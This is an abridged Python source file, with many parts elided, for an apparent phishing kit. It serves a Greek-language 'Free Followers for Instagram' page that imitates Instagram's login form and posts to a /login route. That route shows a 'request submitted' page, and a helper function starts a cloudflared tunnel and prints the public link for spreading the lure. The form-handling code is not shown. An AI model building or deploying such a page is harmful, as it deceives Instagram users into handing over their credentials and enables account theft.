...
def index():
    ...
    <head>
        ...
        <title>Δωρεάν Ακόλουθοι για Instagram</title>
        ...
        <div class="container">
            <div class="login-box">
                <div class="title-container">
                    ...
                    <h1 class="title">Δωρεάν Ακόλουθοι για Instagram</h1>
                </div>
                <form action="/login" method="post">
                    ...
                    <button type="submit" class="login-button">Αποκτήστε Δωρεάν Ακόλουθους</button>
                </form>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">Ή</div>
                ...
                <a href="#" class="forgot-password">Χρειάζεστε βοήθεια για τη σύνδεση;</a>
            </div>
            <div class="signup-box">
                <p>Δεν έχετε λογαριασμό; <a href="#">Εγγραφείτε!</a></p>
            </div>
        </div>
    </body>
    </html>
...
def login():
        ...
        window.onload = function() {
            ...
            setTimeout(function() {
                if (navigator.userAgent.match(/Android/i)) {
                    ...
                    console.log("Η εφαρμογή Instagram δεν βρέθηκε. Εγκαταστήστε την από το κατάστημα εφαρμογών σας.");
                }
            }, 2500);
        };
      </script>
    ...
    <body>
      <div class="container">
        ...
        <p>Η αίτησή σας για δωρεάν ακόλουθους υποβλήθηκε.<br>Η εφαρμογή Instagram θα ανοίξει σε λίγο.</p>
      </div>
    </body>
    </html>
    '''
...
def run_cloudflared_tunnel(local_url):
    ...
    for line in process.stdout:
        ...
        if match:
            ...
            print(f"Δημόσια Σύνδεση Δωρεάν Ακόλουθων: {tunnel_url}")
            sys.stdout.flush()
            break
    return process
